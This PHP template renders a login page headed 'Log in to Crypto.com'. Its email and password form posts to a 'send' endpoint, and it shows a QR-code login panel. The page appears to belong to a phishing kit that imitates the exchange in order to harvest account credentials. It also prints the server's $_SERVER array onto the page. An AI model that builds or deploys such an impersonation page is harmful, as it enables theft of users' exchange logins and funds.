<?php include_once './config.php';?>
<html lang="en">
    <?php
        $title = 'Crypto | LogIn';
        include_once './includes/meta.php'; 
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container-fluid my60'>
            <div class="row">
                <div class="col-sm-12 text-center">
                    <h1 class='h6 mobile_web_font fw-normal pt60 pb50'>Log in to Crypto.com</h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-sm-5 bg-white rounded-0 shadow-lg text-dark pt20 px20">
                    <div class="row">
                        <div class="my20 col-sm-6 border-end border-light-subtle pe25">
                            <?php print_r($_SERVER); ?>
                            <form method="post" action="<?= base_url('send')?>" class="">
                                <div class="mb20">
                                    <label class="form-label fs14">Email Address</label>
                                    <input name="email" type="email" required="" class="form-control form-control-add" placeholder="Enter Your Email Address" value="" >
                                </div>
                                <div class="my20">
                                    <label class="form-label fs14">Password</label>
                                    <input name="password" type="password" required="" minlength="3" class="form-control form-control-add" placeholder="Enter Your Password" value="">
                                </div>
                                <div class="text-center mx-auto d-grid gap-2 my25">
                                    <button type="submit" class="btn btn-danger btn-primary-2 btn-block ">Log In</button>
                                </div>
                                <div class="fs12 my15 fw-normal text-center">
                                    <a href="#" class="text-primary-2 text-decoration-none">Forgot your password?</a> Don't have an account? <a class="text-primary-2 text-decoration-none" href="#">Sign Up Now</a>
                                </div>
                            </form>
                        </div>
                        <div class="col-sm-6 text-center">
                            <p>Scan to log in instantly</p>
                            <img src="./assets/qr_code.png" />
                            <ol class="text-start">
                                <li>Launch the App or Exchange App</li>
                                <li>Tap Menu/Settings > QR Code Scanner</li>
                                <li>Scan the above QR code</li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>